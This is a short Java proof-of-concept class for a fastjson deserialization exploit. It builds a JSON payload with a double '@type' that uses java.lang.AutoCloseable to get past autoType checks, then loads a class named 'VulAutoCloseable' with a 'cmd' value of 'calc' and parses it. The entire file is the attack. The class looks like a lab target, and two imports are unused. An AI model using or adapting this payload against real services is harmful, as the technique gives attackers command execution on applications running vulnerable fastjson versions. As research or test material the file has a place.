import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.shiro.jndi.JndiObjectFactory;

public class Exp {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"VulAutoCloseable\",\"cmd\":\"calc\"}";
        JSON.parse(poc);
    }
}